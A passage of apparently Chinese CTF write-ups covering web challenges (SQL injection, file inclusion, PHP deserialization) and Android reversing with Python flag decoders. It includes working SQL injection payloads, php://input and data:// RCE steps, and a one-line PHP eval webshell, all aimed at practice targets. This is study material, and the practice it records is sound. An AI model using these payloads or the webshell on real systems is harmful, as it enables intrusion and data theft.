alt="image-20210415172253830"></p><p>而在linux中，一个文件名中是可以有问号的。</p><p>这个题用include包含时，也是把第一个/之前的内容看做个文件目录了。即<strong>hint.php?</strong>看成一个目录。</p><p>所以本题要是在windows环境下的话，就必须通过第三个判断，进行二次urlencode才能打通。</p><p>最后，这个include，可以这样无线包含下去吗。。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415172913575.png" alt="image-20210415172913575"></p><h3 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h3><p>从题目名字可以看出考点是sql注入。</p><p>首先测试看一下sql注入类型和引号闭合类型：<br>输入用户名：1’，密码：222，从报错看出单引号闭合。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413221249767.png" alt="image-20210413221249767"></p><p>闭合引号，构造永真尝试登陆：</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413221429789.png" alt="image-20210413221429789"></p><p>登录成功，直接看到flag。</p><h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><p>首先，还是按照之前做过的一个sql注入学到的，测试一下是否有注入与引号闭合类型。</p><p>可以知道是单引号闭合：<br><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210409230543339.png" alt="image-20210409230543339"></p><p>测试一下数据库与前端显示的通道：发现对相关查询指令的大小写都进行了过滤。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210409230808679.png" alt="image-20210409230808679"></p><p>为了多收集信息，接下来再尝试使用order by 来获得列数，在以第一列与第二列排序时正常输出，但第三列报错，说明有2列。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413183501418.png" alt="image-20210413183501418"></p><p>​    </p><p>然后继续尝试报错注入收集信息，有<strong>updatexml</strong>与<strong>extractvalue</strong>，由上面知道，这里过滤了update，所以使用extractvalue：</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413191438306.png" alt="image-20210413191438306"></p><p>这时候即时得到了上面的信息，但又怎么利用呢。。</p><p>堆叠注入，一次执行多条由 ; 分隔的指令。</p><p>查询当前正在使用过的数据库的表：<br><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413191836676.png" alt="image-20210413191836676"></p><p>2个表，继续查询一下他们的字段，看到flag字段：<br><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413192003223.png" alt="image-20210413192003223"></p><p>问题又来了，不能使用select语句，那这里如何查询字段的值呢。。</p><p><strong>第一个方法：使用<a href="https://blog.csdn.net/JesseYoung/article/details/40785137?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">mysql查询语句-handler</a></strong></p><p>首先打开一个句柄：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> handler_table <span class="keyword">open</span>;</span><br></pre></td></tr></table></figure><p>查看表数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> handler_table <span class="keyword">read</span> <span class="keyword">first</span>;</span><br><span class="line"><span class="keyword">handler</span> handler_table <span class="keyword">read</span> <span class="keyword">next</span>;</span><br></pre></td></tr></table></figure><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413193146361.png" alt="image-20210413193146361"></p><p><strong>第二种方法：因为没有禁用rename与alert，所以可以修改表结构。</strong></p><p>因为有一个默认表words，我们输入的inject参数也是传入其中进行查询，所以我们将存放flag的表改为words，并修改flag字段为id字段或者加入id字段，最后通过万能密码查询默认的表就得到flag了。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> <span class="keyword">to</span> words1;<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words; <span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">50</span>);%23</span><br></pre></td></tr></table></figure><p><strong>最后这个题，出现这个漏洞的原因是使用了multi_query()执行一条或多条sql语句。</strong></p><h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><p>从注释中的提示可以看到，通过get方式获取参数cat，并比较了cat参数值是不是字符串dog：</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415130344338.png" alt="image-20210415130344338"></p><p>好突然，直接传入对应的参数，得到flag。。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415130430173.png" alt="image-20210415130430173"></p><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>看wp后复现的（。。</p><p>就一个输入框，还是先尝试了一下之前的方法，输入1’是否报错，报错类型，或者看输入1与1+1的结果是否相等，但这里都无果。但是发现回显只有3种，1.什么也没有；2.Nonono.; 3.Array (    [0] =&gt; 1 )。</p><p>且可以发现，当输入为0，没有显示，纯字符串也没有显示，字符串开头加数字也是没有显示，这其实就可以总结为输入0，没有回显，因为php种，纯字符串或者字符串开头加数字都是会转化为0。</p><p>然后当输入数字时，就会有Array (    [0] =&gt; 1 )这样的回显，且都是1，是dump_var显示的。。</p><p>从以上可以猜测查询语句中有 || 号，这输出结果只有0或1。</p><p>一，官方题解：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br><span class="line">构造成<span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span> || flag <span class="keyword">FROM</span> Flag，其中PIPES_AS_CONCAT能将 || 视为字符串连接符而非或运算符。这种模式下使用字母连接会报错，使用数字连接才会查询出数据，因为这个 || 相当于是将 <span class="keyword">select</span> <span class="number">1</span> 和 <span class="keyword">select</span> flag <span class="keyword">from</span> flag 的结果拼接在一起。</span><br></pre></td></tr></table></figure><p>二，非预期解：</p><p>因为没有过滤*，所以可以通过：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><p>即查询表中所有字段后再查询一个0或1。</p><p>贴一下用预期解查询的结果：</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415202556117.png" alt="image-20210415202556117"></p><h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h2><h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>从提示初始页面，想到index.php。</p><p>访问index.php发现又跳到1.php页面了，但可以看到index.php，从响应头中看到flag，只是状态码为302。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210312231932538.png" alt="image-20210312231932538"></p><p>对于状态码302，可以简单理解为该资源原本存在，但被临时改变了位置。一般被替换了位置后，我们再访问的时候就会自动重定向到一个设置好的网页，且改被设置好的网页在响应头的Location又给出，如上图。</p><h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><p>考了一个robots.txt的协议，首先读了一下题目提供的关于这个的英文文档，总结一下是：在遵循这个协议的搜索引擎访问一个网站时，首先要做的就是访问该网站下的robots.txt文件，若没有的话则表示可以访问该网站下的所有内容，若发现的话，就读取这个文件，并遵守这个文件中的协议指令只访问被允许访问的内容。</p><p>举一个例子：</p><blockquote><p>禁止所有搜索引擎访问本网站的所有内容：<br><strong>User-agent: *</strong></p><p><strong>Disallow: /</strong></p></blockquote><p>所以说这个文件限制了不被允许访问的文件路径，这其实也就间接泄露了这个网站的文件目录结构。</p><p>访问robots.txt得到：<br><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313101940154.png" alt="image-20210313101940154"></p><p>访问fl0g.php得到flag。</p><h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><p>我不知道这个版本的php有这个漏洞，也没有意识去github搜相关版本看是否有相关漏洞。</p><p>这里直接看了wp，知道有一个远程命令执行漏洞，网上利用方式也是很多，目前也不会自己写利用，</p><p>直接使用现成的打了一下。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313104841755.png" alt="image-20210313104841755"></p><h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><p>首先记一下2个包含的区别：</p><ul><li>require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。</li><li>include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。</li></ul><p>文件包含漏洞。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313152324318.png" alt="image-20210313152324318"></p><p>使用了strstr函数匹配<strong>“php://”</strong>字符串进行过滤。</p><blockquote><p>php://input</p><p>将要传递的输入的内容直接以post方式提交即可</p></blockquote><p>要做的就是绕过上面的字符串过滤，可以使用strstr（）函数匹配大小写的特性。</p><p>简单使用<strong>Php://input</strong>即可，然后发现我火狐里用的这个HackBar在Post data里输入数据时不带键值形式，就会无效，相当于没有输入。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210808171708669.png" alt="image-20210808171708669"></p><p>所以使用burpsuit抓包修改，添加post data，首先使用ls命令获取当前目录下的文件。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210808172429835.png" alt="image-20210808172429835"></p><p>然后<strong>cat flag</strong></p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313152604534.png" alt="image-20210313152604534"></p><p>接下来是看wp学习。</p><p>这个题还可以使用data://伪协议。</p><p>使用方法：<strong>data://text/plain;base64,base64编码后的数据</strong>（也就是我们要执行的命令）</p><p>或者：<strong>data://text/plain,传递的数据</strong></p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313153729207.png" alt="image-20210313153729207"></p><p>另外还有可以传入一句话木马。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//111.200.241.244:53435/?page=data://text/plain,%3C?php%20@eval($_POST[root]);%20?%3E</span></span><br></pre></td></tr></table></figure><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313155834858.png" alt="image-20210313155834858"></p><h2 id="第五届XMan选拔"><a href="#第五届XMan选拔" class="headerlink" title="第五届XMan选拔"></a>第五届XMan选拔</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>输入2个变量即可。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210808173824918.png" alt="image-20210808173824918"></p><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>从这个题简单的去了解了一下php中反序列化。</p><p>题目使用highlight_file(__FILE__); 显示出了源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $para;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">"Hel"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">"xctfer"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> Filter;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'what?Really?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hel</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"Hello bro, I guess you are a lazy "</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Filter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span><span class="params">($code)</span></span>&#123;</span><br><span class="line">        $pattern = <span class="string">'/[!|@|#|$|%|^|&amp;|*|=|\'|"|:|;|?]/i'</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match($pattern, $code))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'xctf'</span>]))&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'xctf'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> XMAN;</span><br><span class="line"></span><br><span class="line">&#125; Hello bro, I guess you are a lazy xctfer</span><br></pre></td></tr></table></figure><p>在此前的了解中，对反序列化只知道2个函数unserialize和serialize，及unserialize函数进行反序列前，若代码中有__wakeup魔法函数，则会先执行__wakeup函数；相似的，serialize会先执行__sleep函数，进行对象的清理。当然，也知道序列化的过程是将代码中的对象或数组等变成二进制字节流的形式（其中对象不会序列化方法），方便存储起来与网络中的传输。而对于反序列化的作用只知道是还原，但还原了做什么呢，还原了怎么使用的呢，也正是这个不清楚，我开始看这个题好多疑问😂，如，为什么我随便传入一个序列化字符串去反序列化后报错呢，且调试发现根本就不执行那个魔法函数，就好像传入什么，都没有反馈。</p><p>而后，我去随便找了一篇讲php反序列化的文章看了看，一切就明朗了。</p><p><strong>反序列化的核心是对我们之前通过序列化保存的对象进行重建，而对象的方法是不会进行序列化的，所以我们在反序列化之前，代码中要有反序列化对象的类已经定义。（反序列化时不会调用该类的构造函数！！！）</strong></p><p>所以反序列化，我的理解是在程序中恢复序列化之前的对象，而参数值我们是可以自己构造的。这也有出现了漏洞点（用户的输入。</p><p>另外在<strong>PHP5&lt;5.6.25，PHP7&lt;7.0.10</strong>，有一个CVE-2016-7124：</p><p><strong>当进行反序列化的字符串中标记的属性个数大于该对象的实际属性个数时，魔法函数__wakeup就不会执行了。这个一些题目要绕过__wakeup函数执行的方法。</strong></p><p>而再来看这个题，我们发现唯一能利用的只有一个__wakeup函数，它的主要作用就是对一个类传入参数进行实例化。其中并没有可以执行命令或者读文件的地方，但这个类名和传递的参数是可以我们自己决定的。</p><p>这里是去问了web的朋友，我们可以自己决定类名和参数去实例化一个类，那这个题其实就是考我们去找php中能读文件的原生类来利用，其中去执行构造函数。</p><p>利用SLP类中的类读文件：</p><table><thead><tr><th align="center">类</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">FilesystemIterator</td><td align="center">找目录</td></tr><tr><td align="center">SplFileObject</td><td align="center">读文件</td></tr></tbody></table><p>首先使用FilesystemIterator来查看目录情况：</p><p>复制题目中的XMAN类自己修改为指定的类和参数后new一个对象，打印出来。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class=<span class="string">'FilesystemIterator'</span>;</span><br><span class="line">    <span class="keyword">public</span> $para=<span class="string">"/var/www/html"</span>;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line">$ans  = <span class="keyword">new</span> XMAN();</span><br><span class="line"><span class="keyword">echo</span> serialize($ans);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到：<strong>O:4:”XMAN”:3:{s:5:”class”;s:18:”FilesystemIterator”;s:4:”para”;s:13:”/var/www/html”;s:5:”check”;N;}</strong></p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210808184159850.png" alt="image-20210808184159850"></p><p>同上，在<strong>/var/www/html/xxxXXXmMManNNn</strong>下继续找：</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210808184259568.png" alt="image-20210808184259568"></p><p>最后使用<strong>SplFileObject</strong>类来读f1a4文件：</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210808184410606.png" alt="image-20210808184410606"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Andriod之CTF学习</title>
      <link href="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>从一些Android题目来学习相关知识。</p><a id="more"></a><h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h2><h3 id="easyjni"><a href="#easyjni" class="headerlink" title="easyjni"></a>easyjni</h3><p>来到关键事件，取出输入后传入a方法，在a方法又把输入传入了实例化的一个a类对象中的a方法。全是a。。最后调用native层的ncheck函数。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205171126725.png" alt="image-20210205171126725"></p><p>a类中的a方法一个换表的base64，native层ncheck函数进行简单加密后与密文对比。</p><p>native层有JNIEnv方法，ida不会自动识别，将指定变量改一下类型就行了。<strong>JNIEnv*</strong></p><p>用一下ida-python。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">base = [<span class="string">'i'</span>, <span class="string">'5'</span>, <span class="string">'j'</span>, <span class="string">'L'</span>, <span class="string">'W'</span>, <span class="string">'7'</span>, <span class="string">'S'</span>, <span class="string">'0'</span>, <span class="string">'G'</span>, <span class="string">'X'</span>, <span class="string">'6'</span>, <span class="string">'u'</span>, <span class="string">'f'</span>, <span class="string">'1'</span>, <span class="string">'c'</span>, <span class="string">'v'</span>, <span class="string">'3'</span>, <span class="string">'n'</span>, <span class="string">'y'</span>, <span class="string">'4'</span>, <span class="string">'q'</span>, <span class="string">'8'</span>, <span class="string">'e'</span>, <span class="string">'s'</span>, <span class="string">'2'</span>, <span class="string">'Q'</span>, <span class="string">'+'</span>, <span class="string">'b'</span>, <span class="string">'d'</span>, <span class="string">'k'</span>, <span class="string">'Y'</span>, <span class="string">'g'</span>, <span class="string">'K'</span>, <span class="string">'O'</span>, <span class="string">'I'</span>, <span class="string">'T'</span>, <span class="string">'/'</span>, <span class="string">'t'</span>, <span class="string">'A'</span>, <span class="string">'x'</span>, <span class="string">'U'</span>, <span class="string">'r'</span>, <span class="string">'F'</span>, <span class="string">'l'</span>, <span class="string">'V'</span>, <span class="string">'P'</span>, <span class="string">'z'</span>, <span class="string">'h'</span>, <span class="string">'m'</span>, <span class="string">'o'</span>, <span class="string">'w'</span>, <span class="string">'9'</span>, <span class="string">'B'</span>, <span class="string">'H'</span>, <span class="string">'C'</span>, <span class="string">'M'</span>, <span class="string">'D'</span>, <span class="string">'p'</span>, <span class="string">'E'</span>, <span class="string">'a'</span>, <span class="string">'J'</span>, <span class="string">'R'</span>, <span class="string">'Z'</span>, <span class="string">'N'</span>]</span><br><span class="line">base1 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">s = <span class="string">'MbT3sQgX039i3g==AQOoMQFPskB1Bsc7'</span></span><br><span class="line">s = list(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">2</span>):</span><br><span class="line">    s[<span class="number">2</span>*i], s[<span class="number">2</span>*i+<span class="number">1</span>] = s[<span class="number">2</span>*i+<span class="number">1</span>], s[<span class="number">2</span>*i]</span><br><span class="line">s = s[<span class="number">16</span>:<span class="number">32</span>]+s[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">'='</span>:</span><br><span class="line">        ans += [base.index(i)]</span><br><span class="line">flag = [base1[i] <span class="keyword">for</span> i <span class="keyword">in</span> ans]</span><br><span class="line">flag = base64.b64decode(<span class="string">''</span>.join(flag)+<span class="string">'=='</span>)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#flag&#123;just_ANot#er_@p3&#125;</span></span><br></pre></td></tr></table></figure><h3 id="app3"><a href="#app3" class="headerlink" title="app3"></a>app3</h3><p>这个题涉及的知识挺多，对初学安卓挺不错的。</p><p>从010editor发现了ANDROID BACKUP，安卓备份文件。开始出现新的知识了，找了一篇文章讲这个的学习了一下，讲的真好。<a href="https://blog.csdn.net/qq_31387043/article/details/51452782" target="_blank" rel="noopener">Android中allowBackup</a>，知道了这个可以用android-backup-extractor(abe)工具来解析ab文件。</p><p>对于ab文件，前24字节类似文件头的东西，若文件是加密的话，可以在前24字节中看见AES-256标志，否则出现none字符。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205222314992.png" alt="image-20210205222314992"></p><p>使用<code>java -jar abe.jar unpack 1.ab 1.tar</code>解析文件，这样得到一个tar压缩包。解压后发现有一个apk文件和一些数据库文件。</p><p>上学期学习了java和mysql这2门课程，真是好。hha。。</p><p>看了看反编译apk中的代码，发现创建表操作和其中包含的flag文件：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205222830438.png" alt="image-20210205222830438"></p><p>再加上外面的数据库文件，可以猜测我们的flag就那些数据库中。</p><p>查询相关资料，知道了这个要用DB Browser for SQLite中的SQLCiper的打开，下载后准备打开数据库文件发现要密码。这也和猜想的一样，题目就是要让我们找这个密码。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205223604786.png" alt="image-20210205223604786"></p><p>对于key，通过传入Stranger和123456经过a包中的a，b类中的方法加密。a类中的方法就是字符串截取操作，b类中的方法一个MD5一个SHA-1。程序是可以调试的，所以直接调试得到key。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205223928065.png" alt="image-20210205223928065"></p><p>打开数据库得到一串base64字符串，解密得到flag。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205224023165.png" alt="image-20210205224023165"></p><h3 id="easy-apk"><a href="#easy-apk" class="headerlink" title="easy-apk"></a>easy-apk</h3><p>找到主活动，就一个变表的base64编码，python简单写一下就好：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">base = [<span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>,</span><br><span class="line">        <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>,</span><br><span class="line">        <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span 